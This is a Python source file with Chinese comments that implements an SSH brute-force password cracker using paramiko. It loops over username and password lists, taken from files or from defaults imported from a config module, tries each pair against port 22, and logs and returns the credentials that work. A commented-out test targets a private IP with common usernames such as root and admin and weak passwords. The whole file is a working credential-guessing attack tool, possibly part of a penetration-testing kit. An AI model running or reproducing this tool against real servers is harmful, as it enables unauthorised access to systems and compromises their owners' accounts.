import paramiko
from config import *


# SSH连接函数
def ssh_connect(hostname, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname, port, username, password)
        print(f"[+] 登录成功：{username}@{hostname}:{port}，密码：{password}")
        status = True
    except paramiko.AuthenticationException:
        print(f"[-] 登录失败：{username}@{hostname}:{port}，密码：{password}")
        status = False
    finally:
        ssh.close()
        return status

# 爆破函数
def ssh_brute_force(hostname, port, username_list, password_list):
    userdict = dict()
    for username in username_list:
        for password in password_list:
            status = ssh_connect(hostname, port, username, password)
            if status:
                userdict[username] = password
    return userdict

# 测试
'''hostname = "192.168.64.3"
port = 22
username_list = ["root", "admin", "user"]
password_list = ["password", "123456", "admin123"]

ssh_brute_force(hostname, port, username_list, password_list)'''

def sshCrack(ip:str, userfile:str, passwdfile:str):
    userlist = []
    passwdlist = []
    if not ip:
        return dict()
    if userfile:    # 是否采用指定字典文件
        with open(userfile, "r") as f1:
            userlist = f1.readlines()
            for i in range(len(userlist)):
                userlist[i] = userlist[i].strip()
    if passwdfile:
        with open(passwdfile, "r") as f2:
            passwdlist = f2.readlines()
            for i in range(len(passwdlist)):
                passwdlist[i] = passwdlist[i].strip()
    if not userlist:
        for user in Userdict['ssh']:
            userlist.append(user)
    if not passwdlist:
        passwdlist = Passwords
    #print(userlist, passwdlist)
    return ssh_brute_force(ip, 22, userlist, passwdlist)

#print(sshCrack("192.168.64.3", "test_data/username.txt", "test_data/password.txt"))